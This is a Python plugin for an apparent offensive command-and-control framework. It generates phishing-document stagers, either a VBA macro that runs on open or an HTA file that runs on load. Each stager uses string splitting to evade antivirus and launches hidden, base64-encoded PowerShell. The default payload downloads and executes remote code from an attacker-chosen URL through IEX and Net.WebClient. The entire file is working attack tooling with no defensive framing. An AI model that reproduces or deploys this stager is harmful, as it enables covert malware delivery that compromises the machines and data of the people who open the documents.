"""initial_access/macro_drop — generate advanced VBA macro stager. MITRE T1566.001"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


# Advanced VBA template: uses WScript.Shell + obfuscation to evade simple string-based AV
_MACRO_TEMPLATE = """\
' Auto-generated VBA macro stager
' Splits strings at runtime to reduce static detection surface

Private Declare PtrSafe Function ShellExecuteW Lib "shell32.dll" ( _
    ByVal hwnd As LongPtr, ByVal lpOperation As String, _
    ByVal lpFile As String, ByVal lpParameters As String, _
    ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr

Sub AutoOpen()
    On Error Resume Next
    RunStager
End Sub

Sub Document_Open()
    On Error Resume Next
    RunStager
End Sub

Sub Workbook_Open()
    On Error Resume Next
    RunStager
End Sub

Sub RunStager()
    Dim p1 As String, p2 As String, p3 As String
    Dim ps As String, cmd As String

    ' Split "powershell" across vars to avoid static detection
    p1 = "power"
    p2 = "shell"
    p3 = ".exe"
    ps = p1 & p2 & p3

    ' Build encoded command argument
    Dim enc As String
    enc = "{encoded_cmd}"

    cmd = "-nop -w hidden -NonInteractive -EncodedCommand " & enc

    ' Method 1: WScript.Shell (most compatible)
    On Error GoTo Method2
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run ps & " " & cmd, 0, False
    Set wsh = Nothing
    Exit Sub

Method2:
    ' Method 2: Shell32 ShellExecute
    On Error Resume Next
    ShellExecuteW 0, "open", ps, cmd, "", 0
End Sub
"""

_HTA_TEMPLATE = """\
<html><head><script language="VBScript">
Sub Window_OnLoad
    Dim ps, cmd
    ps = "powers" & "hell.exe"
    cmd = "-nop -w hidden -EncodedCommand {encoded_cmd}"
    CreateObject("WScript.Shell").Run ps & " " & cmd, 0, False
    window.close
End Sub
</script></head><body></body></html>
"""


class MacroDrop(BasePlugin):
    NAME        = "macro_drop"
    DESCRIPTION = "Generate obfuscated VBA macro or HTA stager with pre-encoded PS command."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1566.001"
    CATEGORY    = "initial_access"
    schema      = ParamSchema().add(
        Param("url",    str, required=False, default="",
              help="URL to IEX download from (mutually exclusive with command)"),
        Param("command", str, required=False, default="",
              help="Raw PS command to run (mutually exclusive with url)"),
        Param("format", str, required=False, default="vba",
              help="Output format: vba | hta"),
    )

    @mitre("T1566.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        url     = params.get("url", "").strip()
        command = params.get("command", "").strip()
        fmt     = params.get("format", "vba").lower()

        if not url and not command:
            return ModuleResult.err("Provide url or command")

        # Build the PS one-liner
        if url:
            ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('{url}')"
        else:
            ps_cmd = command

        # Pre-encode on C2 side
        encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")

        if fmt == "hta":
            output = _HTA_TEMPLATE.replace("{encoded_cmd}", encoded)
            ext    = ".hta"
        else:
            output = _MACRO_TEMPLATE.replace("{encoded_cmd}", encoded)
            ext    = ".vba"

        note = (
            f"Format: {fmt.upper()}  Extension: {ext}\n"
            f"PS command: {ps_cmd[:80]}{'...' if len(ps_cmd) > 80 else ''}\n"
            f"Encoded length: {len(encoded)} chars\n"
            f"---\n{output}"
        )
        return ModuleResult.ok(data=note, loot_kind="macro")
